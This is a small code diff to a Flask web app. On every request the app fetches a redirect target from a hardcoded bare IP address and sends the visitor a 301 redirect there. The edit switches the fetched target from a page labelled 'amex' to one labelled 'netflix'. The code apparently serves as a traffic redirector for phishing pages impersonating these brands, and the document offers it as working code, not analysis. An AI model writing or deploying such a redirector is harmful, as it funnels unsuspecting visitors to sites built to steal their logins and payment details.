@@ -9,7 +9,7 @@ app = Flask(__name__)
 @app.route('/<name>')
 def hello(name):
 
-    sheet = requests.get('http://95.111.230.118/kisho/page/active_r.php?page=amex')
+    sheet = requests.get('http://95.111.230.118/kisho/page/active_r.php?page=netflix')
     link = sheet.text.strip().split('"')[1].split('\/\/')
     url = f'{link[0]}//{link[1]}'
     r = make_response(redirect(f"{url}", code=301))
